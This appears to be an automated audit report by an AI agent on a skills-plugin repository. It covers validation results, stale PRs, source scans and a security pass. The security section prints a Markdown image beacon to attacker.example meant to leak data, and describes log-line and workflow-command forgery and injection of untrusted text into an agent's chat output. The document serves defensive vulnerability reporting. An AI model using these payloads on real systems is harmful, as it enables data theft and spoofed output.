---
date: 2026-08-24T07:14:49Z
run_id: 32699971736
duration: ~1h
turns: ~45
cost_usd:
verdict: findings_filed
---

## Audited areas

- `plugins/ievo/skills/*/SKILL.md`: **22 skills** (unchanged since Aug 23). All 22 pass `validate_skills.mjs` (22 passed, 0 errors, 0 warnings).
- `plugins/ievo/agents/*.md`: all **6** pass `validate_agents.mjs` (6 passed, 0 violations).
- `plugins/ievo/scripts/*.mjs`: **6 scripts**. Full local suite (`node --test --experimental-test-coverage`): all green (100.00/99.26/99.15 aggregate incl. test files; all 6 REQUIRED scripts at literal **100/100/100** line/branch/func via `check-coverage.mjs`).
- `plugin.json` + `marketplace.json` + coupled `SCRIPT_VERSION`s: all in sync at **v0.80.21** — up from the Aug 23 audit's v0.80.20 baseline.
- `.github/workflows/*.yml` `timeout-minutes:`: present on all files — no gap.
- README/AGENTS.md universal-positioning grep smell-test: clean.
- `AGENTS.md:428`'s wording nit ("all three `.mjs` scripts as of v0.6.7; no carve-outs") — re-confirmed still present at the same line, unchanged since first noted 2026-08-11. Cosmetic, blocked on push access regardless.
- `.pre-commit-config.yaml`'s `check-merge-conflict` hook still tag-pinned (`rev: v6.0.0`, not SHA) — re-independently re-derived this run's own workflows-module vuln-scan dispatch, confirmed a substance-duplicate of already-open/held `skills#644`, not re-filed.
- Open PRs at scan start: 3, unchanged from Aug 23 — #598 and #597 both still `DIRTY`/`CONFLICTING` (created Aug 8, now **16 days** stale), #581 still `BLOCKED` despite `mergeable: MERGEABLE` (created Aug 7, now **17 days** stale).
- Push-access check: `{"admin":false,"maintain":false,"pull":false,"push":false,"triage":false}` via direct `gh api repos/ievo-ai/skills --jq '.permissions'` for this session's actual authenticating token (`ievo-eva[bot]` App). No push access this run — Step 5 (audit-fix PRs) not executable.
- Deep security pass (Step 3c): 4-module `/ievo:vuln-scanner` dogfooding dispatch (full checkout, same grouping as recent runs) — 8 candidates across all 4 modules, 3 filed (cap reached), 2 dropped as substance-duplicates of already-open/closed work (`#628`, closed-`eva-rejected` `#647`), 3 held below the confidence gate. See Security pass below.
- The 5 prior audit-report PRs to `ievo-ai/eva` flagged as stuck since 2026-08-18 (#382, #391, #399, #428, #430 — Aug 4 through Aug 17) are **still unmerged** as of this run, each carrying a standing `CHANGES_REQUESTED` review from Eva herself over a small formatting slip in a prior run's edit to `findings-backlog.md`/`sources-index.md`. All 5 remain `DIRTY`/`CONFLICTING` per this run's own `gh pr view` check. Not independently attempted to fix this run — remains an operator-attention item (see Blockers/Notes). Also noted: the operator (`rotnov`) filed a feedback issue `ievo-ai/skills#654` ("[idea] Shorten skill descriptions to preserve Codex discovery") shortly before this run started — not an Eva-audit finding, flagged here only for visibility since it shares the `feedback`/`needs-operator` labels this report's Step 5b digest also tracks.
- **Self-correction mid-run:** one of this run's own filed security findings (`S-2026-08-24-002` → `skills#656`) was rejected within minutes by the downstream Router's skeptic-mode review — the exploit chain's proof-of-concept branch name was asserted as "legal Git ref syntax" without running `git check-ref-format` first, and Git's actual ref-name grammar forbids the `[`/`?` characters the PoC depended on. See Security pass and Notes for next run below; this is now recorded so future runs verify `git`/CLI behavior claims the same way tool/library-input claims already get verified.

## Sources scanned (from Step 4)

Scanned 11 of 19 tracked URLs this run (full state: `researches/sources-index.md`); low-cadence docs pages (`docs.anthropic.com`, `blog.google`, `code.claude.com/docs/en/{skills,routines,channels,sub-agents}`), the persistent-403 `openai.com/index/news` (not re-attempted, well-established), and the two first-scan archive entries (Glasswing, `sub-agents.md` dup) were left untouched per established precedent (no signal expected since the Aug 23 pass, or known-error).

Changes detected (3 of 11):
- `github.com/openai/codex/releases`: rust-v0.149.1 shipped today (Aug 24) — confirmed empty-body (`## Changelog` + compare link only, via direct `gh api .../releases/tags/rust-v0.149.1 --jq '.body'`), no skill-format signal.
- `news.ycombinator.com`: different top-story set from Aug 23 — "My agent.md to improve LLM-assisted code quality" (289pts, a prompting/AGENTS.md-authoring guide, not a packaging/skill-format capability iEvo lacks) and "Anthropic's best AI model struggles to attract users as cheaper tools thrive" (438pts, market-adoption commentary) considered, neither skills-repo actionable.
- `agent-plugins.org`: PRs #66/#67 (the two proposals against the 1.1.0 working draft) show comment activity (#66 updated Aug 21, #67 updated Aug 22) but remain open+unmerged — same watch-only status as the Aug 23 report, no new PRs against the draft.

Unchanged (8): `anthropic.com/news` (still Aug 14 "text watermark" as newest), `github.com/anthropics/claude-code/releases` (still v2.1.241, Aug 23 — no new release in the ~1-day gap), `github.com/anthropics/claude-code-action/releases` (still v1.0.201, Aug 23), `agentskills.io/specification` (`gh api` PR check only — no new merges since #492, now a 15-day gap; no full re-fetch triggered), `github.com/agentskills/agentskills` (no new merges since #492; same open PR set), `www.cursor.com/changelog` (still Aug 19 "Cloud Agents and Cursor Harness Improvements" as newest), `github.com/DenisSergeevitch/agents-best-practices` (still `47c5590a`, 14-day gap).

Errors: none (`openai.com/index/news` not re-attempted this run — persistent 403 well-established across many prior runs).

No genuine capability-gap signal cleared the evidence bar this run — the one new release (`codex` rust-v0.149.1) is an empty-body patch, and the HN/agent-plugins.org items considered are either non-actionable or already-tracked watch-only.

## Skills PRs opened

None — no push access this run (see Audited areas).

## Findings filed

none (feature-proposal track) — Step 4's source scan surfaced no new capability-gap signal clearing the evidence bar this run. Feature-proposal backlog unchanged at 2 open (#585, #162).

(Full backlog: `researches/findings-backlog.md`. 3 new `S-` entries this run — see Security pass below.)

## Deferred findings

- **`AGENTS.md:428` wording nit** — unchanged, cosmetic, blocked on push access regardless.
- **PRs #598/#597 are DIRTY/CONFLICTING, now 16 days stale — #581 is BLOCKED, now 17 days stale.** Both need operator attention; read-only access still can't diagnose #581's block reason (`mergeable: MERGEABLE` but `mergeStateStatus: BLOCKED`).
- **`.pre-commit-config.yaml`'s tag-pinned `check-merge-conflict` hook** (CWE-829, medium confidence) — independently re-derived again this run by the workflows-module vuln-scan dispatch, remains a substance-duplicate of already-open/held `skills#644`. Not re-filed.
- **`deep-reviewer.md`'s Coverage-section `coverage_caveats` echo lacking excerpt containment** — independently re-derived this run by the agents+commands-module vuln-scan dispatch, confirmed via direct read of `skills#628`'s own body to be an exact substance-duplicate (same file, same field, same CWE-79 gap). Not re-filed.
- **`evolution_candidates.mjs`'s `appendCandidate` write-path missing directory-containment (symlink) check** — independently re-derived this run by the scripts-module vuln-scan dispatch (CWE-59, low confidence), confirmed via direct read of `skills#647`'s own body (closed, `eva-rejected`) to be the exact same finding, already deliberately deferred/accepted-risk in-source (the code's own comment cites `#647`). Not re-filed — a refuted/closed premise stays dead per the eva#132 rule until a human re-opens it via `approved`.
- **`vuln-scanner.md`'s top-level `notes` field exempt from the file's own Excerpt containment rule** (CWE-79, **low** confidence per the scanning agent — the field is documented as legitimately carrying file-path evidence, but exploitation requires a scanned module to contain an attacker-named path AND the scanning agent to cite it verbatim in `notes` specifically) — held per Step 3c.3's high/medium-only filing rule, not spent on this run's 3-slot cap.
- **`overlay-status/SKILL.md`'s `Bash(awk*)` prefix-matched grant** — independently re-derived again this run by the skills-module vuln-scan dispatch (CWE-269, **low** confidence — the skill's own Rules section already self-discloses this as an accepted, unmitigated risk; the scanning agent found no exploit chain beyond what the source already documents), matching the item already deferred in the Aug 23 report. Not re-filed — still held per the confidence gate.

## Security pass (eva#165)

Step 3c's `/ievo:vuln-scan --module /tmp/skills` dogfooding — full-checkout pass via 4 parallel module dispatches (same grouping as recent runs):

- ran: **true**
- modules scanned: **4** — `plugins/ievo/agents` + `plugins/ievo/commands` (9 files, 3081 lines), `plugins/ievo/skills` (32 files, all read in full, 9953 lines — complete pass, no `scan_complete: false`), `plugins/ievo/scripts` (6 files, 4311 lines, `tests/` excluded), `.github/workflows` + `.github/scripts` + `.pre-commit-config.yaml` (20 files, 4818 lines)
- findings filed: **3** (cap reached), selected from **8 candidates** the four module scans returned, all independently re-verified against current source before filing (direct file reads of the exact cited line, not just trusting the sub-agent's citation):
  - S-2026-08-24-001 → ievo-ai/skills#655 — `discover.mjs` and `evolution_candidates.mjs` echo attacker-influenceable CLI-argument error messages through only `CONTROL_CHAR_RE` (which deliberately excludes `\r`/`\n`), not the `stripForDisplay()` helper `scan_repo.mjs`/`validate_agents.mjs`/`validate_skills.mjs` already adopted (skills#648/#650) — a raw `\r`/`\n` reaching an `errLog()` sink enables terminal-line spoofing and, if the stderr reaches a GitHub Actions job log, workflow-command forgery via a line starting with `::`. CWE-117, **high** confidence, low integrity blast radius — a combined finding covering both files' parallel gaps (same root cause, two independent fix locations, matching the precedent set by skills#648's own two-file combination). Verified via direct re-read of both files' `CONTROL_CHAR_RE` definitions and every echo site, plus confirming `stripForDisplay` is entirely absent from `evolution_candidates.mjs`.
  - S-2026-08-24-002 → ievo-ai/skills#656 — **REJECTED same-run** (see below) — `evolution.md`'s Step 4.4 sub-step 5 autocommit-failure fallback report appends raw git branch name and commit/hook failure-reason text into `.ievo/evolution-candidates/pending.md`'s `Branch:`/`Reason:` lines with no backtick-fencing, unlike the overlay-file-path (regex-validated) and every other Markdown-rendered field this same file writes elsewhere. CWE-79, medium confidence, low confidentiality blast radius. Verified via direct re-read of the Step 4.4 template and its surrounding steps — but the exploit chain's proof-of-concept branch name was NOT verified against `git check-ref-format` before filing.
  - S-2026-08-24-003 → ievo-ai/skills#657 — `version/SKILL.md` fetches `CHANGELOG.md` from `raw.githubusercontent.com` and renders the selected sections verbatim in the chat UI with no excerpt-containment rule anywhere in the file, unlike every sibling skill that touches externally-sourced text (`inspect`, `feedback`, `security-check`, `evo`, `overlay-status`, `deep-review`, `review-retrospective`, `vuln-scan`). CWE-79, medium confidence, low confidentiality blast radius but broad reach (a routine, frequently-invoked read command). Verified via full-file read (189 lines) plus a `grep -in "containment|backtick|fenc"` returning zero matches.
  - 5 candidates not filed: 2 substance-duplicates (`deep-reviewer.md`'s `coverage_caveats` echo → exact duplicate of open `#628`; `evolution_candidates.mjs`'s `appendCandidate` symlink gap → exact duplicate of closed/`eva-rejected` `#647`, already a deliberately-accepted residual risk per the code's own in-source comment), 3 held below the confidence gate (`vuln-scanner.md`'s `notes`-field containment gap, `overlay-status/SKILL.md`'s `Bash(awk*)` grant re-derivation) — see Deferred findings above for all 5.
  - The `.github/workflows`+`.github/scripts` module returned **zero findings** — a clean scan (all `${{ }}` interpolation validated/JSON-escaped before use, all third-party `uses:` SHA-pinned except the already-tracked `.pre-commit-config.yaml` entry, no `pull_request_target`, `forward-to-eva.yml`/`notify-eva.yml` fork-PR gating specifically re-checked and confirmed to exclude external contributors from the trust-sensitive dispatch path) — confirming this surface's hardening continues to hold.
- security-check invocations: 0 (no concrete external `<owner>/<repo>` adoption candidate surfaced this run)
- Live self-triage observed during this run: **yes, on one of this run's own filings** — `#656` was closed `eva-rejected` by the downstream Router's skeptic-mode review within minutes of filing (comment posted 2026-08-24). The refutation: the exploit chain's PoC branch name `` ![x](https://attacker.example/beacon.png?d=leak) `` was asserted as "legal Git ref syntax" without independently running `git check-ref-format` first (only asserted from recall); the reviewer ran it directly and found Git's ref-name grammar (rule 4) forbids `[` and `?`, both of which the PoC depends on — the cited branch name could never actually be created via `git branch`/`git checkout -b`. Per eva#132's skeptic-mode rule, one failed refutation-attempt closes the issue regardless of others. `#655`/`#657` show no label events yet as of report time (filed near the end of this run's window). See `findings-backlog.md`'s `S-2026-08-24-002` entry for the full rejection text and the reviewer's own (unverified-by-Eva) note that a corrected exploit chain via `<failure reason>` — raw pre-commit-hook stderr, unconstrained by git ref grammar — may still be viable for a future re-filing.

## Vetted rejections this run (eva#187)

none — every candidate that reached Step 3b's vet gate either survived (the 3 filed findings, each independently re-read against current source: `discover.mjs:74,550-780` + `evolution_candidates.mjs:129,640-737,251,468`; `evolution.md` Step 4.4 sub-step 5; `version/SKILL.md` full-file read) or was dropped as a **duplicate** of already-open/closed work (`#628`, closed-`eva-rejected` `#647` — not disproven, substance-matched) or held below the confidence gate — none of these qualify for a `vetted-rejections.md` entry per that file's own scope (reserved for genuinely disproven candidates).

## Self-triage last 24h (eva#132)

- `ievo-ai/skills`: approved **0** / rejected **1** (`#656`, this run's own filing — see Security pass) / held **0** new-in-window — all previously-held issues (#644, #637, #633, #628, #610, #608, #588, #585, #584, plus #651/#652 held near the end of the Aug 23 window) are unchanged since their last-noted update.
- `#655`/`#657` (this run's other two new filings) are too recent for any triage disposition beyond the initial `security-finding` label as of report time.
- Noted (not an Eva-audit item): the operator filed `ievo-ai/skills#654` ("[idea] Shorten skill descriptions to preserve Codex discovery") via `/ievo:feedback` at 07:06:54Z today, just before this run started — visible in the same 24h window's activity but authored by `rotnov`, not Eva.

## Eva-filed feedback (last 24h) (eva#158)

- count: **0** — no `/ievo:feedback` issues from `app/ievo-eva` into `ievo-ai/skills` in the window. All 4 module `/ievo:vuln-scan` dispatches this run returned valid, well-formed JSON with no malfunction, so no feedback filing was warranted.

## Blockers

- **No push access to `ievo-ai/skills` this run** — consistent with the baseline since Aug 9 (`push:false, admin:false`), reconfirmed via the direct `gh api repos/ievo-ai/skills --jq '.permissions'` endpoint. No audit-fix candidate this run was significant enough to warrant deferring solely on this blocker.
- **5 prior audit-report PRs to `ievo-ai/eva` remain stuck unmerged** (#382, #391, #399, #428, #430 — Aug 4 through Aug 17, now 7-20 days old), each held by Eva's own standing `CHANGES_REQUESTED` review over a small formatting slip in a previous run's edit to `findings-backlog.md`/`sources-index.md`. Unchanged since first flagged 2026-08-18 — still an operator-attention item this run's scope doesn't cover fixing (would mean pushing fixup commits to 5 separate old branches). Until cleared, `main`'s `researches/` directory continues to under-represent the true state of the backlog/sources-index relative to what those branches contain.

## Notes for next run

- Check triage disposition of `#655`/`#657` (this run's still-pending filings).
- **`git`/CLI behavior claims need the same verify-before-asserting discipline as library/tool-input claims.** `S-2026-08-24-002` (`#656`) was filed and then same-run rejected because its exploit chain asserted a specific string was "legal Git ref syntax" without running `git check-ref-format --branch '<candidate>'` first — the assertion was wrong (Git forbids `[`/`?` in ref names). Before citing ANY git/shell/CLI behavior as a precondition in a future exploit chain, run the one-command check against the actual tool rather than recalling its grammar. This is the same class of lesson CLAUDE.md's "Verify documentation before changing or asserting tool/library behavior" rule already covers for config/library claims — extend the habit to CLI/git-ref-grammar claims too.
- **Possible corrected re-filing candidate (not yet verified, not endorsed):** the Router's rejection of `#656` noted the underlying `evolution.md` Step 4.4 containment gap may still be real via `<failure reason>` (raw pre-commit-hook stderr, entirely unconstrained by git ref grammar) rather than `<branch-name>`. A future run could independently verify this vector — confirm a malicious pre-commit hook actually can print arbitrary Markdown to stderr and that stderr text actually reaches the `Reason:` field unmodified — before considering a corrected re-filing. Do not re-file without fresh Skeptic-mode-quality verification.
- **PRs #598/#597 are DIRTY/CONFLICTING, now 16 days stale — #581 is BLOCKED, now 17 days stale.** Both need operator attention; read-only access still can't diagnose #581's block reason.
- **The 5 stuck audit-report PRs on `ievo-ai/eva` (#382/#391/#399/#428/#430) still need operator attention** — see Blockers. Each review comment names the exact line/section to correct; a future run with time to spare could attempt fixing them directly rather than waiting on a manual merge decision.
- Feature-proposal backlog steady at 2 open (#585, #162); security-finding backlog at **13 open** after this run (directly counted via `gh issue list --state open --label security-finding`: #584, #588, #607, #608, #610, #628, #633, #637, #644, #651, #652, #655, #657) — #650 has already been closed/shipped since the Aug 23 report, #647 was confirmed closed/`eva-rejected` this run, and this run's own #656 is now also closed/`eva-rejected` (all three correctly excluded from the 13).
- The operator's `ievo-ai/skills#654` feedback issue ("Shorten skill descriptions to preserve Codex discovery") is outside this run's audit scope but worth a glance next run if still open — it's a `needs-operator`-labeled idea, not something Eva should act on unilaterally.
